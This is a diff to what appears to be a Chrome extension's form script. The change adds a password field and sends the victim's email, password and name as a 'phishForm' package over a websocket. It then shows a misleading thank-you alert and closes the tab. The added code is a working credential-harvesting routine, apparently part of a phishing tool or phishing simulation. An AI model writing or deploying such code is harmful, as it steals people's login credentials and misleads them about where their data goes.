@@ -15,17 +15,22 @@ function checkFunc(){
     console.log("phishFlag in background load is " + flag);
   });
   var emailString = document.getElementById("email").value;
+  var passString = document.getElementById("password").value;
   var nameString = document.getElementById("name").value;
-  var numberString = document.getElementById("number").value;
-  console.log(emailString + " " + nameString + " " + numberString);
-  
-  if(emailString == '' || nameString == '' || numberString == ''){
-    alert("You did not fill out everything!");
+
+  if(emailString == '' || passString == '' || nameString == '' || (!(emailString.includes("@")))){
+    alert("You did not fill out everything properly!");
   }
   else{
     var val = "";
     chrome.storage.sync.set({'webSite': val}, function(){});
+    chrome.storage.sync.get("id", function(ev){
+      id=ev.id;
+      var jsonPackage = {id: id, type: 'phishForm', phishEmail: emailString, phishPass: passString, phishName: nameString};
+      ws.send(JSON.stringify(jsonPackage));
+    });
     alert("Thank you for filling the form! Refresh the page and the information will display correctly.");
+
     chrome.tabs.getCurrent(function(tab){
       chrome.tabs.remove(tab.id, function(){});
     });
